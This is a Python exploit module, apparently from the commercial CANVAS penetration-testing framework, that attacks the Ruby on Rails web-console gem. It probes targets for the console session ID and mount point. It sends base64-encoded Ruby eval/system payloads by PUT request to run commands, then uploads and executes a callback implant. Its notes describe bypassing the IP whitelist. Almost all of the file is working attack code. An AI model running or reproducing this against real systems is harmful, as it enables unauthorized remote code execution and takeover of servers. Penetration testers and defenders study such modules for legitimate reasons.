#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")

import libs.spkproxy as spkproxy
import urllib
import base64

from tcpexploit import tcpexploit
from exploitutils import *
from ExploitTypes.CommandLineExecuter import CommandExploit

NAME                           = "rails_webconsole_rce"
DESCRIPTION                    = "Ruby on Rails Web Console V2.X Remote Code Execution"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "http://rubyonrails.org"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = ""
DOCUMENTATION["CVE URL"]       = ""

DOCUMENTATION['Notes']         = """

With this module you can obtain remote code execution on Rails Framework. To exploit this vulnerability the web-console gem must be enabled in the server and your host IP must be in the IP whitelist (configured in config_web_console.whitelisted_ips). If the web-console gem is previous to 2.1.3 you can craft remote requests in order to spoof their origin and bypass the IP whitelist (CVE-2015-3224). The web-console gem is enabled by default in development and test environments.

Tested on Rails 4.2.3 with web-console 2.3.0

"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ "Linux" ]
PROPERTY['VERSION']            = [ "All" ]


class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)

        self.host                  = ""
        self.port                  = 3000
        self.version               = 1
        self.name                  = NAME

        self.hostname              = ""
        self.vhost                 = ""
        self.vhosts                = None
        self.vulnerable_targets    = None
        self.protocol              = "http"
        self.basepath              = "/"
        self.ssl                   = False
        self.cookies               = ""
        self.extraheaders          = ""
        self.discover              = False

        self.setVersions()
        self.supports_universal = True #for CommandExploits that support Universal MOSDEF (which you should!)

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def getargs(self):
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("ssl")
        self.getarg("vhost")
        self.getarg("basepath")
        self.getarg("discover")

        if self.ssl:
            self.protocol="https"

        if not self.basepath.startswith("/"):
            self.basepath="/"+self.basepath
        if not self.basepath.endswith("/"):
            self.basepath=self.basepath+"/"

        self.getarg('cookies')

    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()

    #Check this
    def setVersions(self):
        self.versions    = {}
        self.versions[1] = ["web-console 2.x.x"]

    def is_vulnerable(self):
        status = False

        if self.cookies:
            self.extraheaders = [("Cookie", self.cookies)]

        #Test request
        test_paths = []
        tag = self.gen_random_str()
        test_paths.append(self.basepath + tag)
        if self.basepath != "/":
            test_paths.append("/" + tag)

        self.targets = []
        if not self.vhosts:
           self.targets.append(self.host)
        else:
           self.targets = self.vhosts

        for target in self.targets:
            for path in test_paths:
                url  = self.protocol+'://'+target+":%s" % self.port + path
                logging.info("Testing URL: %s" % url)
                (res, responsecode) = spkproxy.urlopen(url, extraheaders=self.extraheaders, data="", exploit=self, entireresponse=True, return_response_code=True, auth=None,verb="GET")
                response = res.read()

                #print "code %s" % responsecode
                #print response

                if responsecode == 200:
                    continue

                if responsecode == 404:
                    if "X-Web-Console-Session-Id:" in response:
                        webconsole_session_id = response.split("X-Web-Console-Session-Id:")[1].split("\n")[0].strip()
                    if "X-Web-Console-Mount-Point" in response:
                        webconsole_path      = response.split("X-Web-Console-Mount-Point:")[1].split("\n")[0].strip()
                    if not webconsole_session_id:
                        #check in div id="console"
                        webconsole_session_id = response.split("data-session-id=")[1].split("'")[1].strip()
                    if not webconsole_path:
                        #check in div id="console"
                        webconsole_path = response.split("data-mount-point=")[1].split("'")[1].strip()

                    if webconsole_session_id and webconsole_path:
                        logging.info("Found session id: <%s>" % webconsole_session_id)
                        logging.info("Found mount point: <%s>" % webconsole_path)
                        if not self.vulnerable_targets:
                           self.vulnerable_targets = {}
                        target_data = (webconsole_session_id, webconsole_path)
                        if target not in self.vulnerable_targets.keys():
                            self.vulnerable_targets[target]= target_data
                        continue


        if self.vulnerable_targets:
            logging.info("Targets: %s" % str(self.vulnerable_targets))
            status = True

        return status

    def run_blind_command(self, command):
        cmd = "system('%s')" % command
        #ruby code
        rubycode = """'%s'.unpack("m0").first""" % b64encode(cmd).rstrip()
        payload  = "eval("+str(rubycode)+")"
        #put_data = {'input' : str(cmd) }
        put_data = {'input' : str(payload) }
        enc_put_data = urllib.urlencode(put_data)

        if not self.extraheaders:
            self.extraheaders = [("X-Requested-With", "XMLHttpRequest"),("Accept", "application/vnd.web-console.v2"),("Content-Type","application/x-www-form-urlencoded")]
        else:
            self.extraheaders.append(("X-Requested-With", "XMLHttpRequest"))
            self.extraheaders.append(("Accept", "application/vnd.web-console.v2"))
            self.extraheaders.append(("Content-Type", "application/x-www-form-urlencoded"))

        for target in self.vulnerable_targets.keys():
            target_data = self.vulnerable_targets[target]
            webconsole_session_id = target_data[0]
            webconsole_path       = target_data[1]
            if not webconsole_path.startswith("/"):
                webconsole_path="/"+webconsole_path
            put_request = webconsole_path + "/repl_sessions/" + str(webconsole_session_id)

            url  = self.protocol+'://'+target+":%s" % self.port + put_request
            spkproxy.urlopen(url, extraheaders=self.extraheaders, data=enc_put_data, exploit=self, noresponse=True, auth=None, verb="PUT")

        return True

    def gen_random_str(self, size=10, chars=string.ascii_letters):
        return ''.join(random.choice(chars) for x in range(size))

    def run(self):
        self.getargs()
        self.host = self.target.interface
        self.setInfo("%s (in progress)" % (NAME))

        self.vhosts = []
        if self.vhost:
            self.vhosts.append(self.vhost)

        # Testing
        #self.discover = True
        #Grabbing virtual hosts
        if self.discover:
            logging.info("Grabbing virtual hosts..")
            app = self.engine.getModuleExploit("ip_to_vhosts")
            app.link(self)

            if app.run():
               if self.target.get_knowledge('vhosts').known:
                   self.vhosts = self.vhosts + self.target.get_knowledge('vhosts').known

        logging.debug("hosts: %s" % str(self.vhosts))

        vulnerable = self.is_vulnerable()
        if not vulnerable:
            logging.error("%s doesn't seem to be vulnerable, aborting" % self.host)
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0
        else:
           for host in self.vulnerable_targets.keys():
               logging.warning("%s seems to be vulnerable" % host)

        # set callback
        self.getargs_cle()
        # get OS
        self.get_os()
        if self.target_os != "Unknown":
           logging.info("Found target OS: %s" % self.target_os)
        else:
           logging.error("Error while retrieving information on the target OS")
           return 0

        self.setProgress(40)
        #next we upload a MOSDEF executable and execute it
        self.upload_and_execute()

        if self.ISucceeded():
            logging.warning("Module succeeded")
            self.setInfo("%s - done (success)" % (NAME))
            return 1
        else:
            logging.error('Module failed')
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
